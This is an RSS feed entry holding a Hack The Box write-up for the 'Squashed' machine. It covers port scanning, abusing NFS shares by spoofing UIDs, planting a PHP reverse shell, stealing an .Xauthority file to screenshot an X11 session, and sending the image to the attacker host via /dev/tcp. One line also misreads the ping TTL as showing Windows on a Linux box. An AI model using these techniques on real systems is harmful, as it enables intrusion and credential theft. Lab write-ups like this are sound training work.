<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Blog]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.png</url><title>Blog</title><link/></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Thu, 30 Oct 2025 18:58:14 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Thu, 30 Oct 2025 18:58:13 GMT</pubDate><ttl>60</ttl><dc:creator/><item><title><![CDATA[Machine Squashed]]></title><description><![CDATA[Tags: <a href=".?query=tag:machine" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#machine">#machine</a> <a href=".?query=tag:htb" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#htb">#htb</a> <a href=".?query=tag:easy" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#easy">#easy</a> <a href=".?query=tag:linux" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#linux">#linux</a> <a href=".?query=tag:x11" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#x11">#x11</a> <a href=".?query=tag:nfs" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#nfs">#nfs</a> <a href=".?query=tag:privilege_escalation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#privilege_escalation">#privilege_escalation</a>ping -c 1 10.10.11.191
<br><img alt="Pasted image 20251024171018.png" src="img/pasted-image-20251024171018.png" target="_self">Based on the TTL values obtained from the ping command, the operating system of the victim machine was identified as Windows. Typically, a TTL value below 64 corresponds to Linux systems, whereas a TTL between 65 and 128 indicates a Windows system. Next, a UDP port scan will be performed.nmap -sU --min-rate 5000 -Pn -n -vvv --open --top-ports 100 10.10.11.191 | grep -v 'no-response'
<br><img alt="Pasted image 20251024171140.png" src="img/pasted-image-20251024171140.png" target="_self">The UDP port scan returned 4 open ports: 111 (rpcbind), 2049 (NFS), 39679 (unknown) and 43472 (unknown). It is important to understand that rpcbind and NFS work together, because when a client wants to use an RPC service like NFSv3, the client asks rpcbind which port to use to make the connection. Furthermore, NFS could be an interesting service to enumerate because it is a protocol that allows sharing resources among computers across a local network as if they were on a local disk. Shared resources can be mounted on a local machine using the mount command; this will be done later. Before that, the discovered ports will be further enumerated in a second nmap scan:nmap -sUVC -p111,2049,39679,43472 10.10.11.191
<br><img alt="Pasted image 20251024171242.png" src="img/pasted-image-20251024171242.png" target="_self">Not much information was revealed; only the RPC services were listed, and the final explanation about how rpcbind and NFS work together can be inferred from the listed RPC services. After this, a second scan will be performed, this time to discover open TCP ports:jmap
<br><img alt="Pasted image 20251024171320.png" src="img/pasted-image-20251024171320.png" target="_self">jmap () { echo -e "\n[+] Introduce una IP\n" read ip echo sudo nmap -sS -n -Pn -p- --min-rate 5000 -vvv --open $ip -oG scan
}
Ignoring the previously discovered ports and focusing on the relevant results, ports 22 (SSH) and 80 (HTTP) were discovered. These open ports give a better idea of the environment on the machine. After that, a further scan will be performed.extracPorts scan
<br><img alt="Pasted image 20251024171341.png" src="img/pasted-image-20251024171341.png" target="_self">extractPorts () { echo -e "Extracting information..." ip_address=$(grep -oP 'Host: \K\S+' "$1" | head -n 1) ports=$(grep -oP '\d+(?=/open)' "$1" | tr '\n' ',' | sed 's/,$/\n/') echo -e "IP Address: $ip_address" echo -e "Open ports: $ports\n" { echo -e "IP Address: $ip_address" echo -e "Open ports: $ports\n" } &gt;&gt; extractPorts.tmp echo "$ports" | xclip -sel clip echo -e "Ports copied to clipboard\n" cat extractPorts.tmp rm extractPorts.tmp
}
The function shown in the image extractPorts, also previously defined in the .zshrc, displays the information from the previous scan and copies the ports to the clipboard. This makes it easier to perform a second scan on the discovered ports, especially when there are many.jmap2 10.10.11.191 22,80,111,2049,36703,40503,47367,50871
<br><img alt="Pasted image 20251024171426.png" src="img/pasted-image-20251024171426.png" target="_self">jmap2 () { if [ "$#" -ne 2 ] then echo "Uso: jmap2 &lt;ip&gt; &lt;puertos&gt;" return 1 fi local ip="$1" local puertos="$2" nmap -p"$puertos" -sCV "$ip" }
The function jmap2, also predefined in the .zshrc, was used to perform a targeted scan on the previously identified ports. This scan aimed to enumerate the running services and their versions, as well as to apply basic reconnaissance scripts against those services. The results did not show anything important apart from the service versions, which can be used to search for the codename of the victim machine.<br><img alt="Pasted image 20251024171558.png" src="img/pasted-image-20251024171558.png" target="_self"><br><img alt="Pasted image 20251024171624.png" src="img/pasted-image-20251024171624.png" target="_self">Both codenames associated with the service versions are identical, so the likelihood that a container is being used is very small. The next step will be to start enumerating the web service, specifically listing the technologies and services running on it:whatweb http://10.10.11.191
<br><img alt="Pasted image 20251024171750.png" src="img/pasted-image-20251024171750.png" target="_self"><br><img alt="Pasted image 20251024171820.png" src="img/pasted-image-20251024171820.png" target="_self">By using whatweb and wappalyzer, we are able to identify the technologies running on the HTTP specified services. No valuable information was obtained; at this point, the source code will be analyzed:<br><img alt="Pasted image 20251024171944.png" src="img/pasted-image-20251024171944.png" target="_self">No valuable information was obtained; a scan to discover web paths and resources will be performed.dirsearch -u http://10.10.11.191/ --exclude-status=403,404
<br><img alt="Pasted image 20251024172139.png" src="img/pasted-image-20251024172139.png" target="_self">Neither scan showed valuable information; at this time, the next step will be to perform a manual web enumeration to find potential attack vectors:<br><img alt="Pasted image 20251025015212.png" src="img/pasted-image-20251025015212.png" target="_self">When the website was enumerated, it was discovered that all buttons with associated links redirect to the same main page, so the website is not important to consider at this time. The next step will be to enumerate the NFS service to find valuable information:showmount -e 10.10.11.191
mkdir -p /tmp/home/ross; mount -t nfs 10.10.11.191:/home/ross /tmp/home/ross
mkdir -p /tmp/var/www/html; mount -t nfs 10.10.11.191:/var/www/html /tmp/var/www/html
<br><img alt="Pasted image 20251024173950.png" src="img/pasted-image-20251024173950.png" target="_self">To start the enumeration, the first command used was showmount to list all shared resources that can be mounted on the local system. Two resources were displayed: /home/ross and /var/www/html. Both shared resources were then mounted into created folders named after the shared resources using the mount command. Finally, the folders were successfully mounted at the respective created paths:<br><img alt="Pasted image 20251024182717.png" src="img/pasted-image-20251024182717.png" target="_self">When the mounted /var/www/html shared resource was carefully enumerated, it was found that the html folder owner had UID 2017. This is potentially vulnerable because that user exists on the victim machine but not on the local machine; a local user could be created with UID 2017 to take advantage of this and gain full access to the html folder. Finally, if this folder is synchronized with the HTTP service running on the victim machine, a reverse shell or similar could be uploaded to gain access to the victim machine. Let's check this theory:useradd pwned
usermod pwned -u 2017
cat /etc/passwd | grep pwned
<br><img alt="Pasted image 20251024182843.png" src="img/pasted-image-20251024182843.png" target="_self">The first step was completed: a local user with UID 2017 was created. Next, a reverse shell was to be created using revshells.com:<br><img alt="Pasted image 20251024182941.png" src="img/pasted-image-20251024182941.png" target="_self">sudo -u pwned cp revshell.php /tmp/var/www/html/revshell.php
<br><img alt="Pasted image 20251024183057.png" src="img/pasted-image-20251024183057.png" target="_self">The reverse shell was successfully created, and when an attempt was made to upload it to the html folder, it worked. So the only remaining step would be to make an HTTP request to the web route that contains the uploaded reverse shell:nc -nlvp 443
curl 10.10.11.191/revshell.php
<br><img alt="Pasted image 20251024183202.png" src="img/pasted-image-20251024183202.png" target="_self">The reverse shell connection was established, and the postâ€‘exploitation stage began, during which the system will be enumerated to find potential vectors to reach the root user.<br><img alt="Pasted image 20251024183326.png" src="img/pasted-image-20251024183326.png" target="_self">Once the user flag was displayed, the previously discovered NFS shared resource /home/ross will be enumerated in case it contains anything important:<br><img alt="Pasted image 20251024195246.png" src="img/pasted-image-20251024195246.png" target="_self">The listed resources revealed an important finding: a .Xauthority file. This file is associated with the X11 service, which acts as an intermediary connecting applications to the display and keyboard, allowing the GUI to operate both locally and remotely. The .Xauthority file manages access permissions to the X11 server on Unix/Linux systems. The next step, knowing this, will be to enumerate whether there is a running X11 session for any user:w
<br><img alt="Pasted image 20251024195354.png" src="img/pasted-image-20251024195354.png" target="_self">One session was found for the user ross. Given a valid session, there are many options to interact with it, for example, taking a screenshot of what the connected user is viewing. To do that, the .Xauthority file must be read and its path exported into an environment variable called XAUTHORITY. Apparently there are no read permissions for the .Xauthority file, but using the previously described concept of abusing locally mounted NFS shared resources, another user could be created to read the file, transfer it to the victim machine, and export it into the environment variable. Let's verify whether this works:<br><img alt="Pasted image 20251024200332.png" src="img/pasted-image-20251024200332.png" target="_self">useradd ross
usermod ross -u 1001
sudo -u ross ls -laR /tmp/home/ross/.Xauthority
<br><img alt="Pasted image 20251024200421.png" src="img/pasted-image-20251024200421.png" target="_self">The user with UID 1001 was created; then an attempt was made to read the contents of the .Xauthority file:echo $(sudo -u ross cat /tmp/home/ross/.Xauthority | base64) | base64 -d &gt; /tmp/.Xauthority
<br><img alt="Pasted image 20251024200602.png" src="img/pasted-image-20251024200602.png" target="_self">Nice! the .Xauthority file content could be redirected to a local file, then this new file will be shared with the victim machine to allow interact with the open X11 session:python3 -m http.server 80
<br><img alt="Pasted image 20251024200918.png" src="img/pasted-image-20251024200918.png" target="_self">wget http://10.10.16.6/.Xauthority
export XAUTHORITY=/tmp/.Xauthority
xwd -root -screen -silent -display :0 &gt; /tmp/screen.xwd
<br><img alt="Pasted image 20251024201043.png" src="img/pasted-image-20251024201043.png" target="_self">The .Xauthority file was successfully transferred to the victim machine and stored in the XAUTHORITY environment variable. Finally, a screenshot of the running X11 session was taken; to view the image, it will be shared with the attacker machine:cat screen.xwd &gt; /dev/tcp/10.10.16.6/1234
nc -nlvp 1234 &gt; screen.xwd
display screen.xwd
<br><img alt="Pasted image 20251024201316.png" src="img/pasted-image-20251024201316.png" target="_self">Great! The screenshot displayed the root password in the KeePass application; this could be used to escalate privileges. Let's check it:<br><img alt="Pasted image 20251024201442.png" src="img/pasted-image-20251024201442.png" target="_self">Finally, the password worked, and the target machine was successfully pwned!!]]></description><link>machine-squashed.html</link><guid isPermaLink="false">Markdown writeups/Machine Squashed.md</guid><pubDate>Thu, 30 Oct 2025 16:51:54 GMT</pubDate><enclosure url="img/pasted-image-20251024171018.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="img/pasted-image-20251024171018.png"&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>